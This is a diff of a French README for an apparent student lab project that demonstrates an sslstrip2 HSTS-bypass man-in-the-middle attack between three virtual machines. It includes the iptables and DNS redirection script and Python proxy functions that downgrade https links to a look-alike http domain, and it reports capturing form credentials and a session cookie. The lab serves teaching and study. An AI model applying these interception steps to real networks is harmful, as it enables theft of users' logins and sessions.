@@ -18,14 +18,13 @@ L'environnement de test consiste en trois machines virtuelles :
 
 - immortal, la machine attaquante, positionnée en homme du milieu.
 
-Voici la topologie des machines mise en place,
-[topology](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/topology) :
+Voici la [topology](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/topology) des machines mise en place :
+
 
 ```
 ### twolans
 #
 #  opeth - [s1] - immortal - [s2] - grave
-#
 #
 #
 
@@ -38,42 +37,38 @@ HOST debian10  immortal s1 s2
 HOST debian10  opeth    s1
 ```
 
-Cette topologie n'est pas forcément réaliste car rare sont les cas où l'attaquant
-est dans le réseau du client attaqué.
+Cette topologie n'est pas forcément réaliste car rare sont les cas où l'attaquant est dans le réseau du client attaqué.
 
-Toutes les configurations initiales des machines se trouvent dans le fichier
-__"start.sh"__ de chaque dossier correspondant aux machines.
+Toutes les configurations initiales des machines se trouvent dans le fichier __"start.sh"__ de chaque dossier correspondant aux machines.
 
 ## Machine "grave" (147.210.13.2)
 
 Cette machine utilise l'environnement graphique de la distribution Linux Alpine. Le navigateur firefox est utilisé pour la démonstration.
 
-Au lancement de la machine, il faut configurer l'autorité de certification dans firefox. Se reporter au fichier [start.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/grave/start.sh)
+Au lancement de la machine, il faut configurer l'autorité de certification dans firefox. Se reporter au fichier [start.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/grave/start.sh).
 
 ## Machine "opeth" (147.210.12.1)
 
-Cette machine héberge un serveur HTTP(s) Nginx sur le port 80 et 443. Le certificat utilisé pour les connections HTTPS a été généré avec openssl :
-
-D'abord on crée une autorité de certification :
+Cette machine héberge un serveur HTTP(s) Nginx sur le port 80 et 443. Le certificat utilisé pour les connections HTTPS a été généré avec openssl grâces aux scripts présents dans le dossier [CA](https://github.com/t00sh/mastercsi-ter/blob/master/CA). D'abord on crée une autorité de certification :
 
 ```
-\# Crée la clef root
+# Crée la clef root
 openssl genrsa -out root-ca.key 4096
 
-\# Certificat auto-signé
+# Certificat auto-signé
 openssl req -x509 -new -nodes -key root-ca.key -sha256 -days 512 -out root-ca.pem
 ```
 
-Puis on peut créer un certificat pour le serveur opeth, signé avec la clef de l'autorité de certificati que l'on vient de créer :
+Puis on peut créer un certificat pour le serveur opeth, signé avec la clef de l'autorité de certification que l'on vient de créer :
 
 ```
-\# Crée la clef privée
+# Crée la clef privée
 openssl genrsa -out cert.key 4096
 
-\# Crée la requête
+# Crée la requête
 openssl req -new -key cert.key -out cert.csr
 
-\# Signe le certificat avec le CA
+# Signe le certificat avec la clef de la CA
 openssl x509 -req -in cert.csr -CA root-ca.pem -CAkey root-ca.key -CAreateserial -out cert.pem -days 365 -sha256
 ```
 
@@ -85,16 +80,15 @@ Le serveur héberge deux pages :
 
 ## Machine "immortal" (147.210.12.2 - 147.210.13.1)
 
-C'est sur cette machine que se trouve le PoC de l'attaque, dans le fichier [/mnt/host/attack.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/attack.sh). Cette VM est configuré pour forwarder les paquets entre opeth et grave.
+C'est sur cette machine que se trouve le PoC de l'attaque, dans le fichier [/mnt/host/attack.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/attack.sh). Cette VM est configurée pour forwarder les paquets entre opeth et grave.
 
-Si elle reçoit une requête DNS sur la table iptables PREROUTING, alors elle renvoie ce paquet sur son propre port DNS pour l'attaque. Vous pouvez consulter le fichier de configuration [dnsmasq.conf](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/dnsmasq.conf)
+Si elle reçoit une requête DNS sur la chaîne iptables PREROUTING, alors elle redirige ce paquet sur son propre serveur DNS ([dnsmasq](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/dnsmasq.conf)) pour l'attaque.
 
 ------------------------------------------------------
 
 # Démo
 
-Pour lancer l'environnement de test, il faut lancer la commande suivante
-(on aura récupéré au préalable le dépôt qemunet) :
+Pour lancer l'environnement de test, il faut lancer la commande suivante (on aura récupéré au préalable le dépôt [qemunet](https://gitlab.inria.fr/qemunet/core)) :
 
 ```
 $ ./qemunet/qemunet.sh -x -S sslstrip
@@ -104,9 +98,7 @@ $ ./qemunet/qemunet.sh -x -S sslstrip
 
 ## Étape 1 : avant l'attaque
 
-Lorsque l'attaque n'est pas encore lancée, nous pouvons voir sur la machine grave,
-que tout se passe normalement et que la requête POST passe bien en HTTPS
-(immortal est donc incapable de voir les identifiants envoyés) :
+Lorsque l'attaque n'est pas encore lancée, nous pouvons voir sur la machine grave que tout se passe normalement et que la requête POST passe bien en HTTPS (immortal est donc incapable de voir les identifiants envoyés) :
 
 ![screen1](../medias/sslstrip/screen1.png?raw=true)
 
@@ -120,29 +112,27 @@ Nous arrivons alors sur la page secure.php, en HTTPS : immortal n'a pas pût voi
 
 ## Etape 2 : lancement de l'attaque
 
-Comme expliqué précédement, pour lancer l'attaque, il faut exécuter le fichier
-__[/mnt/host/attack.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/attack.sh)__ depuis immortal. Voici son contenu :
+Comme expliqué précédement, pour lancer l'attaque, il faut exécuter le fichier __[/mnt/host/attack.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/attack.sh)__ depuis immortal. Voici son contenu :
 
 ```
 PROXY_PORT=4242
 
 iptables -t nat -F
 
-\# Redirection 80 -> PROXY
+# Redirection 80 -> PROXY
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PROXY_PORT
 
-\# Redirection 53 -> Dnsmasq
+# Redirection 53 -> Dnsmasq
 iptables -t nat -A PREROUTING -p udp -m state --state NEW --destination-port 53 -j REDIRECT --to-port 53
 
-\# Résout le domain attaqué
+# Résout le domain attaqué
 echo "147.210.12.1 www.opeth.local" > /etc/hosts
 echo "147.210.12.1 www.opeth.secure" >> /etc/hosts
 echo "147.210.12.1 wwww.opeth.secure" >> /etc/hosts
 service dnsmasq restart
-
 ```
-On peut constater que les flux TCP à destination du port 80 (HTTP) sont redirigées
-vers le port d'écoute du proxy qui est chargé d'analyser et traiter les requêtes. Aussi, les requêtes DNS sont redirigées vers le port DNS de l'attaquant.
+
+On peut constater que les flux TCP à destination du port 80 (HTTP) sont redirigées vers le port d'écoute du proxy qui est chargé d'analyser et traiter les requêtes. Aussi, les requêtes DNS sont redirigées vers le serveur DNS de l'attaquant.
 
 Nous pouvons maintenant lancer l'attaque depuis la machine immortal :
 
@@ -155,12 +145,10 @@ Nous pouvons maintenant lancer l'attaque depuis la machine immortal :
 Lors de la réception de requêtes, il s'agit de savoir si l'on doit :
 
 - fermer la connexion (le client ou le serveur a fermé la connection)
-- établir une connexion https, dans le cas où le client demande la page, au travers du fake host [index.php](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php)
-- établir une connexion http, dans le cas où le client demande la page d'accueil
-[index.php](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/local/index.php)
+- établir une connexion https, dans le cas où le client va sur le domaine [wwww.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/secure/index.php)
+- établir une connexion http, dans le cas où le client demande la page du domaine [www.opeth.local](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/opeth/www/local/index.php)
 
-Le code est dans le fichier
-[sslstrip.py](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/sslstrip2.py)
+Le code est dans le fichier [sslstrip.py](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip2/immortal/sslstrip2.py). La fonction traitant les différentes requêtes est celle-ci :
 
 ```python
 def __recv(self, csock):
@@ -188,18 +176,33 @@ def __recv(self, csock):
 
 ```
 
-A la fin, on transforme tous les liens __https__ trouvé en __http__, on remplace le nom de domaine par le faux nom de domaine et on recalcule la taille de la requête (entête Content-Length).
+À la fin, on transforme tous les liens __https__ trouvés en __http__ en remplaçant le nom de domaine www.opeth.secure par le faux nom de domaine wwww.opeth.secure, on met l'entête Host vers le bon domaine et on recalcule la taille de la requête (entête Content-Length).
 
 #### Transformation des liens
+
+Dans cette fonction, nous utilisons une expression régulière afin de remplacer tous les liens https://www.opeth.secure en http://wwww.opeth.secure.
 
 ```python
 def __replace_https_to_http(self, data):
     return re.sub(b'https://' + bytes(FORWARD_HOST_HSTS),
                   b'http://' + bytes(FAKE_HOST), data)
+```
 
+#### Modification de l'entête Host
+
+Lorsque la victime est redirigée vers un lien http://wwww.opeth.secure, l'entête Host de ses requêtes sera éronné. Cette fonction modifie cette entête pour que le serveur puisse recevoir un Host correct.
+
+```python
 def __replace_host(self, data):
     return re.sub(b'Host: ' + bytes(FAKE_HOST),
                   b'Host: ' + bytes(FORWARD_HOST_HSTS), data)
+```
+
+#### Recalcule de l'entête Content-Length
+
+La taille de la requête étant modifiée par le proxy, celui-ci doit recalculer l'entête Content-Length en se basant sur la chaîne "\r\n\r\n" signalant la fin des entêtes dans le protocole HTTP.
+
+```python
 def __replace_content_length(self, data):
     try:
         idx = data.index(b"\r\n\r\n")
@@ -210,28 +213,19 @@ def __replace_content_length(self, data):
         return data
 ```
 
-La transformation se fait à l'aide d'une expression régulière qui remplace __https://www.opeth.secure__ par __http://wwww.opeth.secure__.
-
-La deuxième fonction quand le navigateur du client envoit une requete http vers le faux nom de domain. On doit alors modifier le domaine pour y remettre le vrai nom.
-
-La troisième fonction recalcule le Content-Length en recherchant le début des données (après la séquence "\r\n\r\n").
-
 ## Etape 3 : pendant l'attaque
 
 Lorsque l'attaque est lancée, on peut voir que le lien sensible https://www.opeth.secure est remplacé par http://wwww.opeth.secure.
-La machine immortal est donc capable d'intercepter les échanges réalisés sur la
-page secure.php.
-Ici on voit dans l'encadré rouge, que le lien https:// a bien été remplacé par
-un lien non sécurisé http:// :
+La machine immortal est donc capable d'intercepter les échanges réalisés sur le domaine www.opeth.secure.
+
+Ici on voit dans l'encadré rouge, que le lien https:// a bien été remplacé par un lien non sécurisé http:// :
 
 ![screen5](../medias/sslstrip2/screen1.png?raw=true)
 
-Nous constatons que nous arrivons sur la page secure.php en HTTP : notre
-navigation n'est pas sécurisée !
+Nous constatons que nous arrivons sur la page secure.php en HTTP : notre navigation n'est pas sécurisée !
 
 ![screen6](../medias/sslstrip2/screen2.png?raw=true)
 
-La machine immortal a été capable de capturer non seulement les identifiants du
-formulaire, mais également le cookie de session :
+La machine immortal a été capable de capturer non seulement les identifiants du formulaire, mais également le cookie de session :
 
 ![screen7](../medias/sslstrip/screen7.png?raw=true)
